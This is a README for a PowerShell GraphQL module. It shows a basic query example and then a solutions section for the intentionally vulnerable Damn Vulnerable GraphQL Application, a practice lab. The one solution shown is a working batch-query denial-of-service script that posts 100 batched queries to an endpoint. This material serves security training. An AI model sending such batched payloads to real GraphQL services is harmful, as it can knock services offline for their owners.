# PSGraphQL
This PowerShell module contains functions that facilitate querying and create, update, and delete (mutations) operations for GraphQL endpoints.

## Examples

### Send a GraphQL query to an endpoint with the results returned as JSON

```powershell
$url = "https://mytargetserver/v1/graphql"

$myQuery = '
query {
  users {
    created_at
    id
    last_seen
    name
  }
}
'
$requestHeaders = @{ myApiKey="aoMGY{+93dx&t!5)VMu4pI8U8T.ULO" }

Invoke-GraphQLQuery -Query $myQuery -Headers $requestHeaders -Uri $url -Raw
```

# Damn Vulnerable GraphQL Application Solutions

Damn Vulnerable GraphQL Application is an intentionally vulnerable implementation of Facebook's GraphQL technology, to learn and practice GraphQL Security. For more on DVGQL, please see: https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application

The solutions below are written in PowerShell exclusively but two of the solutions required Invoke-WebRequest as opposed to this modules Invoke-GraphQLQuery.

```powershell
# GraphQL endpoint for all solutions below:
$gqlEndpointUri = "https://mygraphqlserver.company.com/graphql"
```

## Denial of Service :: Batch Query Attack

```powershell
# Generate 100 queries:
$amountOfQueries = 100
$jsonEntry = '{"query":"query {\n  systemUpdate\n}","variables":[]}'
$jsonObjects = (1..$amountOfQueries | ForEach-Object { $jsonEntry }) -join ","
$batchQueryAttackPayload = "[" + $jsonObjects + "]"

Invoke-WebRequest -Uri $gqlEndpointUri -Method Post -Body $batchQueryAttackPayload -ContentType "application/json" | Select -Expand Content
```
